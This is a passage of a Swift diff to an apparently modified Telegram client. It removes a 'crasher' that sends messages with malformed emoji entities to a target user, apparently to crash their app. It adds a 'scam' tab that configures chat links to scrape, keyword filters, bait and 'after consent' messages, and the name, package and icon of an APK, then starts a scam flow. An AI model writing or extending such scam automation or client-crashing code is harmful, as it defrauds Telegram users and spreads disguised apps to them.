-                            range: malformedOffset ..< (malformedOffset + malformedLength),
-                            type: .CustomEmoji(stickerPack: nil, fileId: 5377305978079288312)
-                        )
-                    ])
-                ],
-                inlineStickers: [:],
-                mediaReference: nil,
-                threadId: nil,
-                replyToMessageId: nil,
-                replyToStoryId: nil,
-                localGroupingKey: nil,
-                correlationId: nil,
-                bubbleUpEmojiOrStickersets: []
-            )
-            
-            appendResponse("crasher sending to peerId=\(targetPeerId.toInt64()) offset=\(malformedOffset) length=\(malformedLength) textLen=\(messageText.count)")
-            
-            let _ = (enqueueMessages(account: context.account, peerId: targetPeerId, messages: [message])
-            |> deliverOnMainQueue).start(next: { messageIds in
-                let hasMessageId = messageIds.contains(where: { $0 != nil })
-                if hasMessageId {
-                    if let firstId = messageIds.first, let messageId = firstId {
-                        appendResponse("crasher enqueued messageId=\(messageId.id) namespace=\(messageId.namespace) peerId=\(messageId.peerId.toInt64())")
-                    } else {
-                        appendResponse("crasher enqueued hasMessageId=true but first is nil")
-                    }
-                } else {
-                    appendResponse("crasher enqueued but all messageIds are nil")
-                }
-            }, completed: {
-                appendResponse("crasher signal completed")
-            })
+            appendResponse("crasher disabled reason=OFFENSIVE_PATH_REMOVED")
         },
         sendCrasherDirect: {
             appendResponse("crasherDirect disabled reason=OFFENSIVE_PATH_REMOVED")
@@ -3613,8 +4268,10 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
         },
         addNftUsernameTag: {
             let currentState = stateValue.with { $0 }
-            let normalizedUsername = eahatGramNormalizedUsernameTag(currentState.nftUsernameTagText)
-            let normalizedPriceText = eahatGramNormalizedNftPriceText(currentState.nftUsernamePriceText)
+            let fallbackUsername = EahatGramDebugSettings.nftUsernameTag.with { $0 }
+            let fallbackPriceText = EahatGramDebugSettings.nftUsernamePrice.with { $0 }
+            let normalizedUsername = eahatGramNormalizedUsernameTag(fallbackUsername.isEmpty ? currentState.nftUsernameTagText : fallbackUsername)
+            let normalizedPriceText = eahatGramNormalizedNftPriceText(fallbackPriceText.isEmpty ? currentState.nftUsernamePriceText : fallbackPriceText)
             guard !normalizedUsername.isEmpty else {
                 appendResponse("addNftUsernameTag failed reason=USERNAME_EMPTY")
                 return
@@ -3628,7 +4285,65 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
             EahatGramDebugSettings.setNftUsernameTag(normalizedUsername)
             EahatGramDebugSettings.setNftUsernamePrice(normalizedPriceText)
             EahatGramDebugSettings.setNftUsernamePurchaseDate(purchaseDate)
-            appendResponse("addNftUsernameTag completed username=\(normalizedUsername) total=\(totalCount)")
+            updateState { current in
+                var current = current
+                current.nftUsernameTagText = normalizedUsername
+                current.nftUsernamePriceText = normalizedPriceText
+                return current
+            }
+            appendResponse("addNftUsernameTag completed username=\(normalizedUsername) price=\(normalizedPriceText) total=\(totalCount)")
+        },
+        updateReplaceSource: { value in
+            let normalized = eahatGramNormalizedReplaceText(value)
+            updateState { current in
+                var current = current
+                current.replaceSourceText = normalized
+                return current
+            }
+        },
+        updateReplaceTarget: { value in
+            let normalized = eahatGramNormalizedReplaceText(value)
+            updateState { current in
+                var current = current
+                current.replaceTargetText = normalized
+                return current
+            }
+        },
+        addReplaceRule: {
+            let currentState = stateValue.with { $0 }
+            let source = eahatGramNormalizedReplaceText(currentState.replaceSourceText)
+            let target = eahatGramNormalizedReplaceText(currentState.replaceTargetText)
+            guard !source.isEmpty && !target.isEmpty else {
+                appendResponse("replace add failed reason=EMPTY_SOURCE_OR_TARGET")
+                return
+            }
+            var rules = currentState.replaceRules
+            rules.removeAll(where: { $0.source.lowercased() == source.lowercased() })
+            rules.append(EahatGramReplaceRule(source: source, target: target))
+            eahatGramSaveReplaceRules(rules)
+            updateState { current in
+                var current = current
+                current.replaceSourceText = ""
+                current.replaceTargetText = ""
+                current.replaceRules = eahatGramLoadReplaceRules()
+                return current
+            }
+            appendResponse("replace added \(source) -> \(target)")
+        },
+        removeReplaceRule: { index in
+            var rules = stateValue.with { $0.replaceRules }
+            guard index >= 0 && index < rules.count else {
+                appendResponse("replace remove failed index=\(index) reason=OUT_OF_RANGE")
+                return
+            }
+            let removed = rules.remove(at: index)
+            eahatGramSaveReplaceRules(rules)
+            updateState { current in
+                var current = current
+                current.replaceRules = eahatGramLoadReplaceRules()
+                return current
+            }
+            appendResponse("replace removed \(removed.source) -> \(removed.target)")
         },
         updateFakePhoneNumber: { value in
             let normalized = eahatGramNormalizedNumericText(value, maxLength: 15)
@@ -4359,6 +5074,191 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
                 return
             }
             appendResponse("otherMethod title=\(methods[index].title) info=\(methods[index].info)")
+        },
+        updateScamChatLink: { index, value in
+            updateState { current in
+                var current = current
+                if index < current.scamChatLinks.count {
+                    current.scamChatLinks[index] = value
+                }
+                return current
+            }
+        },
+        addScamChatLink: {
+            updateState { current in
+                var current = current
+                if current.scamChatLinks.count < 6 {
+                    current.scamChatLinks.append("")
+                }
+                return current
+            }
+        },
+        updateScamSearchWord: { index, value in
+            updateState { current in
+                var current = current
+                if index < current.scamSearchWords.count {
+                    current.scamSearchWords[index] = value
+                }
+                return current
+            }
+        },
+        addScamSearchWord: {
+            updateState { current in
+                var current = current
+                if current.scamSearchWords.count < 5 {
+                    current.scamSearchWords.append("")
+                }
+                return current
+            }
+        },
+        updateScamMustIncludeEnabled: { value in
+            updateState { current in
+                var current = current
+                current.scamMustIncludeEnabled = value
+                return current
+            }
+        },
+        updateScamMustIncludeWord: { index, value in
+            updateState { current in
+                var current = current
+                if index < current.scamMustIncludeWords.count {
+                    current.scamMustIncludeWords[index] = value
+                }
+                return current
+            }
+        },
+        addScamMustIncludeWord: {
+            updateState { current in
+                var current = current
+                if current.scamMustIncludeWords.count < 3 {
+                    current.scamMustIncludeWords.append("")
+                }
+                return current
+            }
+        },
+        updateScamMessageText: { value in
+            updateState { current in
+                var current = current
+                current.scamMessageText = value
+                return current
+            }
+        },
+        updateScamMessageTextAfterConsent: { value in
+            updateState { current in
+                var current = current
+                current.scamMessageTextAfterConsent = value
+                return current
+            }
+        },
+        updateScamAddFileEnabled: { value in
+            updateState { current in
+                var current = current
+                current.scamAddFileEnabled = value
+                return current
+            }
+        },
+        updateScamApiKey: { value in
+            updateState { current in
+                var current = current
+                current.scamApiKey = value
+                return current
+            }
+        },
+        updateScamApkName: { value in
+            updateState { current in
+                var current = current
+                current.scamApkName = value
+                return current
+            }
+        },
+        updateScamApkPackage: { value in
+            updateState { current in
+                var current = current
+                current.scamApkPackage = value
+                return current
+            }
+        },
+        selectScamAvatar: {
+            let controller = context.sharedContext.makeMediaPickerScreen(
+                context: context,
+                peer: nil,
+                threadTitle: nil,
+                chatLocation: nil,
+                bannedSendPhotos: nil,
+                bannedSendVideos: nil,
+                subject: .assets(nil),
+                saveEditedPhotos: false,
+                selectStickers: false,
+                present: { c, a in
+                    presentControllerImpl?(c)
+                },
+                initialLayout: nil,
+                editingContext: nil
+            )
+            controller.completion = { result, _ in
+                if case let .assets(assets) = result, let asset = assets.first {
+                    let options = PHImageRequestOptions()
+                    options.deliveryMode = .highQualityFormat
+                    options.isSynchronous = false
+
+                    PHImageManager.default().requestImage(
+                        for: asset.asset,
+                        targetSize: CGSize(width: 512, height: 512),
+                        contentMode: .aspectFill,
+                        options: options
+                    ) { image, _ in
+                        if let image = image, let data = image.jpegData(compressionQuality: 0.8) {
+                            updateState { current in
+                                var current = current
+                                current.scamApkAvatarData = data
+                                return current
+                            }
+                            appendResponse("Avatar selected, size: \(data.count) bytes")
+                        }
+                    }
+                }
+            }
+            presentControllerImpl?(controller)
+        },
+        toggleScamFlow: {
+            let currentState = stateValue.with { $0 }
+
+            if currentState.scamIsRunning {
+                // Stop scam flow
+                EahatGramScamManager.shared.stopScamFlow()
+                updateState { current in
+                    var current = current
+                    current.scamIsRunning = false
+                    return current
+                }
+                appendResponse("Scam flow stopped")
+            } else {
+                // Start scam flow
+                let config = EahatGramScamConfig(
+                    chatLinks: currentState.scamChatLinks.filter { !$0.isEmpty },
+                    searchWords: currentState.scamSearchWords.filter { !$0.isEmpty },
+                    mustIncludeEnabled: currentState.scamMustIncludeEnabled,
+                    mustIncludeWords: currentState.scamMustIncludeWords.filter { !$0.isEmpty },
+                    messageText: currentState.scamMessageText,
+                    messageTextAfterConsent: currentState.scamMessageTextAfterConsent,
+                    addFileEnabled: currentState.scamAddFileEnabled,
+                    apiKey: currentState.scamApiKey,
+                    apkName: currentState.scamApkName,
+                    apkPackage: currentState.scamApkPackage,
+                    apkAvatarData: currentState.scamApkAvatarData
+                )
+
+                EahatGramScamManager.shared.setup(context: context)
+                EahatGramScamManager.shared.updateConfig(config)
+                EahatGramScamManager.shared.startScamFlow()
+
+                updateState { current in
+                    var current = current
+                    current.scamIsRunning = true
+                    return current
+                }
+                appendResponse("Scam flow started")
+            }
         }
     )
 
@@ -4375,7 +5275,7 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
 
         let controllerState = ItemListControllerState(
             presentationData: ItemListPresentationData(presentationData),
-            title: .textWithTabs("eahatGram", ["me", "test", "chain", "ai", "farm", "functest", "walpaper"], state.selectedTab.rawValue),
+            title: .textWithTabs("eahatGram", ["me", "test", "chain", "ai", "farm", "replace", "functest", "walpaper", "scam"], state.selectedTab.rawValue),
             leftNavigationButton: nil,
             rightNavigationButton: nil,
             backNavigationButton: ItemListBackButton(title: presentationData.strings.Common_Back),
